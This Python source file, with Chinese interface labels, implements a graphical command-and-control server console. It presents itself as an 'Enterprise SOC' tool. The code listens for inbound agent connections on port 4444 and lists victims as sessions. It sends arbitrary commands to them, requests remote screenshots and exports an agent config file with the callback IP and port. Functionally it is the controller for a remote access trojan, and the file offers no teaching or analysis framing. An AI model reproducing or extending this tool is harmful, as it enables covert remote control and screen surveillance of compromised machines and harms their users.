import socket
import threading
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import io

class EnterpriseC2Console:
    def __init__(self, root):
        self.root = root
        self.root.title("Enterprise C2 Security Operations Center (SOC) - 视窗监控版")
        self.root.geometry("1200x750")
        
        self.server_socket = None
        self.is_running = False
        self.clients = {}  # {addr_str: {"conn": conn, "id": session_id}}
        self.session_counter = 1

        # --- 顶部：企业级状态与控制栏 ---
        top_frame = tk.LabelFrame(root, text=" 监听与服务控制中心 ", padx=10, pady=10)
        top_frame.pack(fill="x", padx=10, pady=5)

        tk.Label(top_frame, text="监听端口:").grid(row=0, column=0, sticky="w")
        self.port_entry = tk.Entry(top_frame, width=8)
        self.port_entry.insert(0, "4444")
        self.port_entry.grid(row=0, column=1, padx=5)

        self.start_btn = tk.Button(top_frame, text="启动监听服务", bg="#28a745", fg="white", font=("Arial", 9, "bold"), command=self.toggle_server)
        self.start_btn.grid(row=0, column=2, padx=10)

        tk.Label(top_frame, text="| 目标回连IP:").grid(row=0, column=3, sticky="w")
        self.target_ip_entry = tk.Entry(top_frame, width=15)
        self.target_ip_entry.insert(0, "127.0.0.1")
        self.target_ip_entry.grid(row=0, column=4, padx=5)

        self.gen_btn = tk.Button(top_frame, text="生成配置模板", bg="#6f42c1", fg="white", font=("Arial", 9, "bold"), command=self.generate_config)
        self.gen_btn.grid(row=0, column=5, padx=10)

        # --- 中部：专业表格化会话矩阵与右侧实时预览窗 ---
        mid_pane = tk.PanedWindow(root, orient=tk.HORIZONTAL, sashwidth=6)
        mid_pane.pack(fill="both", expand=True, padx=10, pady=5)

        # 左侧区域：会话表格与下方回显终端
        left_pane = tk.PanedWindow(mid_pane, orient=tk.VERTICAL, sashwidth=6)
        mid_pane.add(left_pane, width=750)

        # 上半部分：上线主机矩阵表格 (Treeview)
        table_frame = tk.LabelFrame(left_pane, text=" 活跃会话矩阵 (Active Sessions) ")
        left_pane.add(table_frame, height=220)

        columns = ("id", "ip", "status", "connect_time")
        self.tree = ttk.Treeview(table_frame, columns=columns, show="headings", selectmode="browse")
        self.tree.heading("id", text="会话 ID")
        self.tree.heading("ip", text="客户端远程地址 (IP:Port)")
        self.tree.heading("status", text="运行状态")
        self.tree.heading("connect_time", text="上线时间")
        
        self.tree.column("id", width=80, anchor="center")
        self.tree.column("ip", width=220, anchor="w")
        self.tree.column("status", width=100, anchor="center")
        self.tree.column("connect_time", width=180, anchor="center")
        
        tree_scroll = ttk.Scrollbar(table_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=tree_scroll.set)
        
        self.tree.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        tree_scroll.pack(side="right", fill="y", pady=5)
        self.tree.bind("<<TreeviewSelect>>", self.on_tree_select)

        # 下半部分：高级回显终端与审计日志
        terminal_frame = tk.LabelFrame(left_pane, text=" 实时指令回显与审计日志 (Terminal Output) ")
        left_pane.add(terminal_frame, height=250)

        self.log_text = scrolledtext.ScrolledText(terminal_frame, wrap="word", bg="#1e1e1e", fg="#00ff00", font=("Consolas", 10))
        self.log_text.pack(fill="both", expand=True, padx=5, pady=5)

        # 右侧区域：【实时桌面预览/监看窗口】
        preview_frame = tk.LabelFrame(mid_pane, text=" 选中目标实时桌面预览 (Live Screen Preview) ")
        mid_pane.add(preview_frame, width=400)

        self.preview_label = tk.Label(preview_frame, text="[请在左侧选中会话并点击刷新预览]", bg="black", fg="white", font=("Arial", 10))
        self.preview_label.pack(fill="both", expand=True, padx=5, pady=5)

        self.screen_btn = tk.Button(preview_frame, text="获取当前屏幕截图", bg="#17a2b8", fg="white", font=("Arial", 9, "bold"), command=self.request_screenshot)
        self.screen_btn.pack(fill="x", padx=5, pady=5)

        # --- 底部：控制指令下发 ---
        bottom_frame = tk.LabelFrame(root, text=" 指令下发面板 ", padx=10, pady=10)
        bottom_frame.pack(fill="x", padx=10, pady=5)

        tk.Label(bottom_frame, text="控制命令:").grid(row=0, column=0, sticky="w")
        self.cmd_entry = tk.Entry(bottom_frame, width=85, font=("Consolas", 10))
        self.cmd_entry.grid(row=0, column=1, padx=5)
        self.cmd_entry.bind("<Return>", lambda event: self.send_command())

        self.send_btn = tk.Button(bottom_frame, text="执行下发", bg="#007bff", fg="white", font=("Arial", 9, "bold"), command=self.send_command)
        self.send_btn.grid(row=0, column=2, padx=10)

        self.selected_addr = None

    def log(self, message):
        self.log_text.insert(tk.END, message + "\n")
        self.log_text.see(tk.END)

    def toggle_server(self):
        if not self.is_running:
            try:
                port = int(self.port_entry.get())
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.bind(("0.0.0.0", port))
                self.server_socket.listen(10)
                self.is_running = True
                
                self.start_btn.config(text="停止监听", bg="#dc3545")
                self.port_entry.config(state="disabled")
                self.log(f"[*] 核心控制服务已成功启动，绑定端口: {port}")

                threading.Thread(target=self.accept_clients, daemon=True).start()
            except Exception as e:
                messagebox.showerror("系统错误", f"监听启动失败: {str(e)}")
        else:
            self.is_running = False
            if self.server_socket:
                self.server_socket.close()
            self.start_btn.config(text="启动监听服务", bg="#28a745")
            self.port_entry.config(state="normal")
            self.log("[-] 核心控制服务已安全关闭。")

    def accept_clients(self):
        import time
        while self.is_running:
            try:
                conn, addr = self.server_socket.accept()
                addr_str = f"{addr[0]}:{addr[1]}"
                session_id = f"SESS-{self.session_counter:03d}"
                self.session_counter += 1
                
                connect_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                self.clients[addr_str] = {"conn": conn, "id": session_id}
                
                self.root.after(0, lambda aid=session_id, ast=addr_str, ct=connect_time: self.tree.insert("", "index", values=(aid, ast, "活跃在线", ct)))
                self.log(f"[+] 新会话接入 [{session_id}] -> 客户端源地址: {addr_str}")

                threading.Thread(target=self.handle_client, args=(conn, addr_str, session_id), daemon=True).start()
            except:
                break

    def handle_client(self, conn, addr_str, session_id):
        while self.is_running:
            try:
                data = conn.recv(8192)
                if not data:
                    break
                try:
                    output = data.decode('gbk')
                except:
                    output = data.decode('utf-8', errors='ignore')

                self.root.after(0, lambda sid=session_id, out=output: self.log(f"\n[Session {sid} 回显结果]:\n{out}"))
            except:
                break
        
        if addr_str in self.clients:
            del self.clients[addr_str]
        self.root.after(0, lambda ast=addr_str: self.remove_session_ui(ast))

    def remove_session_ui(self, addr_str):
        for item in self.tree.get_children():
            val = self.tree.item(item, "values")
            if val[1] == addr_str:
                self.tree.delete(item)
                self.log(f"[-] 会话断开 -> 目标地址: {addr_str}")
                break

    def on_tree_select(self, event):
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            self.selected_addr = item["values"][1]
            self.log(f"[*] 当前锁定交互会话目标: {item['values'][0]} ({self.selected_addr})")

    def send_command(self):
        if not self.selected_addr:
            messagebox.showwarning("操作提示", "请先在上方【活跃会话矩阵】中点击选中一个目标会话！")
            return
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            return
        
        target_info = self.clients.get(self.selected_addr)
        if target_info:
            conn = target_info["conn"]
            try:
                conn.sendall(cmd.encode('utf-8'))
                self.log(f"[-> 下发至 {target_info['id']}]: {cmd}")
                self.cmd_entry.delete(0, tk.END)
            except Exception as e:
                messagebox.showerror("传输错误", f"指令下发失败: {str(e)}")

    def request_screenshot(self):
        if not self.selected_addr:
            messagebox.showwarning("提示", "请先在会话矩阵中选中一个目标，才能截取其屏幕预览！")
            return
        self.log(f"[*] 正在向目标 {self.selected_addr} 发送屏幕截图指令...")
        target_info = self.clients.get(self.selected_addr)
        if target_info:
            try:
                # 向客户端下发内置截屏关键字命令
                target_info["conn"].sendall("CAPTURE_SCREEN_ACTION".encode('utf-8'))
            except Exception as e:
                messagebox.showerror("错误", f"发送截图请求失败: {str(e)}")

    def generate_config(self):
        ip = self.target_ip_entry.get().strip()
        port = self.port_entry.get().strip()
        config_data = f"# Enterprise C2 Agent Configuration\nC2_SERVER_IP = '{ip}'\nC2_SERVER_PORT = {port}\n"
        try:
            with open("agent_enterprise_config.py", "w", encoding="utf-8") as f:
                f.write(config_data)
            messagebox.showinfo("生成完毕", f"企业级配置文件已成功导出至同级目录。\n目标回连 IP: {ip} | 端口: {port}")
        except Exception as e:
            messagebox.showerror("错误", f"导出配置失败: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = EnterpriseC2Console(root)
    root.mainloop()
